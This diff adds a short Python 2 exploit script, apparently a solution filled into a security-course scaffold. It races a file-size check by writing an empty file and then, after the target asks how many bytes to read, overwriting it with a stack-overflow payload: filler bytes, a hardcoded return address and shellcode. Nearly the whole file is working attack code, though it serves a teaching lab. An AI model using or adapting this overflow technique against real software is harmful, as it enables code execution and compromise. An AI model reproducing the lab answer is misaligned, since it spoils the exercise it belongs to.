@@ -1,0 +1,31 @@
+#!/usr/bin/env python2
+
+from scaffold import *
+
+### YOUR CODE STARTS HERE ###
+
+f = open("hack", "w")
+f.write("")
+f.flush()
+f.close()
+
+p.start()
+
+assert p.recv(30) == 'How many bytes should I read? '
+
+f = open("hack", "w")
+f.write("A"*144 + "B"*4 + "\x80\xfc\xff\xbf" + SHELLCODE + "D"*300)
+f.flush()
+f.close()
+
+p.send("300\n")
+
+assert p.recv(18) == 'Here is the file!\n'
+print p.recv(200)
+
+### YOUR CODE ENDS HERE ###
+
+returncode = p.end()
+
+if returncode == -11: print 'segmentation fault or stack canary!'
+elif returncode != 0: print 'return code', returncode
